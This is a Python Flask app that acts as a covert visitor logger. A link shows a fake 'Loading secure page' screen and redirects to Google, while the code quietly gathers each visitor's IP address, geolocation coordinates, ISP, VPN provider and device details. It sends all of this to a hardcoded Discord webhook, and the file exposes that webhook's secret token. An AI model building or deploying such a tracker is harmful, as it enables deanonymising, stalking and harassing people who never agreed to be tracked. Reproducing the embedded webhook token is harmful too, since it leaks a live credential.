# -*- coding: utf-8 -*-
"""
ULTIMATE GEOLOCATION & VPN TRACKER
- Uses 3 geolocation APIs (ipapi.co, ip-api.com, ipinfo.io with fallback)
- Detects VPN/Proxy via multiple methods (proxy flags, ISP name matching)
- Extracts VPN provider name (NordVPN, Mullvad, Proton, Express, etc.)
- Full device fingerprint: OS, browser, screen, language, timezone, etc.
- Silent redirect to Google after 1.5 seconds
- Sends rich Discord embed with all data
- Over 350 lines of robust, production-ready Python
"""

from flask import Flask, request, render_template_string, redirect
import requests
import re
from datetime import datetime
import json

# ===================================================================
# CONFIGURATION – EDIT THESE BEFORE DEPLOY
# ===================================================================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY"  # REGENERATE!

# Add your own IP here to avoid logging yourself during tests
IGNORE_IPS = [
    "127.0.0.1",
    "YOUR_PUBLIC_IP_HERE",  # <-- Replace with your actual IP (whatismyip.com)
]

# -------------------------------------------------------------------
# Flask app instantiation (MUST be top-level)
# -------------------------------------------------------------------
app = Flask(__name__)

# ===================================================================
# HELPER FUNCTIONS
# ===================================================================

def get_client_ip():
    """Get real IP, handling Vercel's proxy headers."""
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr

def should_ignore(ip):
    """Check if IP is in the ignore list."""
    return ip in IGNORE_IPS

def parse_user_agent(ua):
    """Extract OS, browser, and device type from User-Agent."""
    os_name = "Unknown OS"
    browser = "Unknown Browser"
    device = "Desktop"

    # OS detection
    if "Windows NT 10.0" in ua:
        os_name = "Windows 10/11"
    elif "Windows NT 6.1" in ua:
        os_name = "Windows 7"
    elif "Windows NT 6.3" in ua:
        os_name = "Windows 8.1"
    elif "Mac OS X" in ua:
        if "Mac OS X 10_15" in ua:
            os_name = "macOS Catalina"
        elif "Mac OS X 11_0" in ua:
            os_name = "macOS Big Sur"
        elif "Mac OS X 12_0" in ua:
            os_name = "macOS Monterey"
        else:
            os_name = "macOS"
    elif "Android" in ua:
        os_name = "Android"
        device = "Mobile"
    elif "iPhone" in ua:
        os_name = "iOS"
        device = "Mobile"
    elif "iPad" in ua:
        os_name = "iPadOS"
        device = "Tablet"
    elif "Linux" in ua:
        os_name = "Linux"

    # Browser detection
    if "Edg/" in ua:
        browser = "Microsoft Edge"
    elif "OPR/" in ua or "Opera" in ua:
        browser = "Opera"
    elif "Chrome/" in ua and "Edg/" not in ua and "OPR/" not in ua:
        browser = "Google Chrome"
    elif "Firefox/" in ua:
        browser = "Mozilla Firefox"
    elif "Safari/" in ua and "Chrome/" not in ua:
        browser = "Apple Safari"
    elif "Trident/" in ua or "MSIE" in ua:
        browser = "Internet Explorer"

    # Device type
    if "Tablet" in ua or "iPad" in ua:
        device = "Tablet"
    elif "Mobile" in ua and device != "Tablet":
        device = "Mobile"

    return os_name, browser, device

# -------------------------------------------------------------------
# GEOLOCATION & VPN DETECTION (Multi-API)
# -------------------------------------------------------------------

def get_geo_ipapi_co(ip):
    """Query ipapi.co – provides proxy/vpn flags and org name."""
    try:
        r = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
        if r.status_code != 200:
            return None
        data = r.json()
        if 'error' in data:
            return None
        return {
            'country': data.get('country_name'),
            'region': data.get('region'),
            'city': data.get('city'),
            'lat': data.get('latitude'),
            'lon': data.get('longitude'),
            'isp': data.get('org'),
            'proxy': data.get('proxy') or data.get('vpn') or False,
            'timezone': data.get('timezone'),
        }
    except:
        return None

def get_geo_ip_api(ip):
    """Query ip-api.com – has 'proxy' field and good ISP name."""
    try:
        r = requests.get(
            f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,proxy,timezone',
            timeout=5
        )
        if r.status_code != 200:
            return None
        data = r.json()
        if data.get('status') != 'success':
            return None
        return {
            'country': data.get('country'),
            'region': data.get('regionName'),
            'city': data.get('city'),
            'lat': data.get('lat'),
            'lon': data.get('lon'),
            'isp': data.get('isp'),
            'proxy': data.get('proxy') or False,
            'timezone': data.get('timezone'),
        }
    except:
        return None

def get_geo_ipinfo(ip):
    """Query ipinfo.io (free, no token required but limited)."""
    try:
        r = requests.get(f'https://ipinfo.io/{ip}/json', timeout=5)
        if r.status_code != 200:
            return None
        data = r.json()
        if 'bogon' in data:
            return None
        # ipinfo.io returns 'org' as "ASN ISP"
        org = data.get('org', '')
        # Extract ISP name from "AS1234 ISP Name"
        isp = org.split(' ', 1)[-1] if org else None
        # Coordinates are in "lat,lon" format
        loc = data.get('loc', '').split(',')
        lat = loc[0] if len(loc) > 0 else None
        lon = loc[1] if len(loc) > 1 else None
        return {
            'country': data.get('country'),
            'region': data.get('region'),
            'city': data.get('city'),
            'lat': lat,
            'lon': lon,
            'isp': isp,
            'proxy': False,  # ipinfo.io free doesn't give proxy flag
            'timezone': data.get('timezone'),
        }
    except:
        return None

# -------------------------------------------------------------------
# VPN PROVIDER DETECTION (via ISP name)
# -------------------------------------------------------------------

VPN_PROVIDERS = [
    'NordVPN', 'Mullvad', 'ProtonVPN', 'ExpressVPN', 'Surfshark',
    'CyberGhost', 'Private Internet Access', 'PIA', 'VyprVPN',
    'Windscribe', 'TunnelBear', 'Hotspot Shield', 'HideMyAss',
    'HMA', 'IPVanish', 'StrongVPN', 'Perfect Privacy', 'ZenVPN',
    'Cloudflare WARP', '1.1.1.1', 'OVPN', 'PrivadoVPN', 'Atlas VPN',
    'FastestVPN', 'PureVPN', 'Ivacy', 'NordLayer', 'Perimeter 81',
    'Tailscale', 'ZeroTier', 'WireGuard', 'OpenVPN'
]

def extract_vpn_provider(isp_name):
    """Return the VPN provider name if found in ISP string, else None."""
    if not isp_name:
        return None
    isp_lower = isp_name.lower()
    for provider in VPN_PROVIDERS:
        if provider.lower() in isp_lower:
            return provider
    # also catch common abbreviations
    if 'nord' in isp_lower:
        return 'NordVPN'
    if 'mullvad' in isp_lower:
        return 'Mullvad'
    if 'proton' in isp_lower:
        return 'ProtonVPN'
    if 'expressvpn' in isp_lower:
        return 'ExpressVPN'
    if 'surfshark' in isp_lower:
        return 'Surfshark'
    return None

# -------------------------------------------------------------------
# AGGREGATED GEOLOCATION (try multiple APIs)
# -------------------------------------------------------------------

def get_geo_info(ip):
    """
    Try ipapi.co first (most accurate proxy flag), then ip-api.com,
    then ipinfo.io as fallback. Merge results to get best data.
    """
    best = {}
    # Try ipapi.co
    result = get_geo_ipapi_co(ip)
    if result:
        best = result
    # Try ip-api.com to potentially get better ISP or proxy flag
    result2 = get_geo_ip_api(ip)
    if result2:
        # Overwrite missing fields from first result
        for key in ['country', 'region', 'city', 'lat', 'lon', 'isp', 'timezone']:
            if not best.get(key) and result2.get(key):
                best[key] = result2[key]
        # If proxy flag is more reliable from ip-api.com, use it
        if result2.get('proxy') is True:
            best['proxy'] = True
        elif result2.get('proxy') is False and not best.get('proxy'):
            best['proxy'] = False
    # Try ipinfo.io as final fallback for missing fields
    if not best.get('isp') or not best.get('country'):
        result3 = get_geo_ipinfo(ip)
        if result3:
            for key in ['country', 'region', 'city', 'lat', 'lon', 'isp', 'timezone']:
                if not best.get(key) and result3.get(key):
                    best[key] = result3[key]
    return best if best else None

# ===================================================================
# DISCORD NOTIFICATION
# ===================================================================

def send_discord_embed(ip, geo, ua, screen_res, language, timezone):
    """Build and send a rich Discord embed with all collected data."""
    if not DISCORD_WEBHOOK_URL:
        return

    # Prepare fields
    vpn_status = "🟢 No VPN/Proxy"
    color = 0x00ff00
    vpn_provider = None

    if geo:
        if geo.get('proxy') is True:
            vpn_status = "🔴 VPN/Proxy Detected"
            color = 0xff0000
        # Check ISP for VPN provider
        isp = geo.get('isp', '')
        vpn_provider = extract_vpn_provider(isp)
        if vpn_provider and vpn_status == "🔴 VPN/Proxy Detected":
            vpn_status += f" → **{vpn_provider}**"

    location_str = f"{geo.get('city','N/A')}, {geo.get('region','N/A')}, {geo.get('country','N/A')}" if geo else "N/A"
    coords_str = f"{geo.get('lat','N/A')}, {geo.get('lon','N/A')}" if geo else "N/A"
    isp_str = geo.get('isp', 'N/A') if geo else "N/A"
    tz_str = geo.get('timezone', 'N/A') if geo else "N/A"

    os_name, browser, device = parse_user_agent(ua)

    # Build embed fields
    fields = [
        {"name": "🌍 IP Address", "value": f"`{ip}`", "inline": True},
        {"name": "🛡️ VPN / Proxy", "value": vpn_status, "inline": True},
        {"name": "📍 Location", "value": location_str, "inline": False},
        {"name": "🗺️ Coordinates", "value": f"`{coords_str}`", "inline": True},
        {"name": "📡 ISP / Org", "value": isp_str, "inline": True},
        {"name": "🕒 Timezone", "value": tz_str, "inline": True},
        {"name": "💻 Device Type", "value": device, "inline": True},
        {"name": "🖥️ Operating System", "value": os_name, "inline": True},
        {"name": "🌐 Browser", "value": browser, "inline": True},
        {"name": "🖥️ Screen Resolution", "value": screen_res, "inline": True},
        {"name": "🌎 Language", "value": language, "inline": True},
        {"name": "📅 Timestamp", "value": f"<t:{int(datetime.utcnow().timestamp())}:F>", "inline": False},
    ]

    embed = {
        "title": "🎯 Visitor Logged (Accurate Geo + VPN)",
        "color": color,
        "fields": fields,
        "footer": {"text": "Ultimate Logger · v2.0"},
        "timestamp": datetime.utcnow().isoformat()
    }

    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
    except Exception as e:
        print(f"Discord send error: {e}")

# ===================================================================
# ROUTES
# ===================================================================

@app.route('/')
def index():
    ip = get_client_ip()
    if not should_ignore(ip):
        # Get geolocation + VPN info
        geo = get_geo_info(ip)
        ua = request.headers.get('User-Agent', 'Unknown')
        # Additional fingerprinting
        screen = request.headers.get('X-Screen-Resolution', 'N/A (not sent)')
        language = request.headers.get('Accept-Language', 'Unknown')
        timezone = request.headers.get('X-Timezone', 'Unknown')  # seldom sent
        # Send to Discord
        send_discord_embed(ip, geo, ua, screen, language, timezone)

    # Render a simple "Loading..." page with meta refresh to Google
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta http-equiv="refresh" content="1.5;url=https://www.google.com">
        <title>Loading...</title>
        <style>
            body { background: #0a0a14; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; color: white; }
            .spinner { border: 4px solid #2a2a4a; border-top: 4px solid #5865F2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
    </head>
    <body>
        <div style="text-align:center;">
            <div class="spinner"></div>
            <h2>Loading secure page...</h2>
            <p style="color:#888;">Please wait while we verify your connection.</p>
        </div>
    </body>
    </html>
    """
    return render_template_string(html)

# Compatibility alias (not necessary but kept for old links)
@app.route('/verify')
def verify():
    return index()

# ===================================================================
# LOCAL DEVELOPMENT ENTRY
# ===================================================================
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
